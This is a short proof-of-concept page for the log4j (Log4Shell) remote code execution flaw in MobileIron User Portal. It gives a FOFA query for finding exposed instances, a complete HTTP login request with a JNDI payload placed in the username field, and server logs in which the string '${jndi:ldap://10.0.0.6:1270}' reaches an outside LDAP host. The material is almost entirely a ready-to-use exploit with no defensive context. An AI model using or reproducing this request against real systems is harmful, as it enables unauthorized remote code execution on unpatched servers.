# MobileIron User Portal log4j RCE

## fofa

```
app="MobileIron-User-Portal"
```

## Poc

```
POST /mifs/j_spring_security_check HTTP/1.1
Host: <Target>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://<Target>/mifs/user/login.jsp
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: https://<Target>
Connection: close
Cookie: JSESSIONID=BE682E060EBF041A2B65EAC7E47F4F80
Upgrade-Insecure-Requests: 1

j_username=<JNDI Payload>&j_password=password&logincontext=employee
```

Logs

```
2021-12-20 21:44:41,385 ERROR [LocalHostAuthenticationProvider.authenticate:76] (http-nio-127.0.0.1-8081-exec-5:[])  {pathInfo=null} Cannot find user '${jndi:ldap://10.0.0.6:1270}'
2021-12-20 21:50:12,486 INFO  [MIUserServiceImpl.updateFailedLoginStatus:3436] (http-nio-127.0.0.1-8081-exec-5:[])  {pathInfo=null} User ${jndi:ldap://10.0.0.6:1270} failed to login attempt 1 from ipaddress 10.0.0.6
2021-12-20 21:50:12,491 WARN  [MIUserServiceImpl.saveFailedLoginAttempts:2987] (http-nio-127.0.0.1-8081-exec-5:[])  {pathInfo=null} No User found with username ${jndi:ldap://10.0.0.6:1270}
```
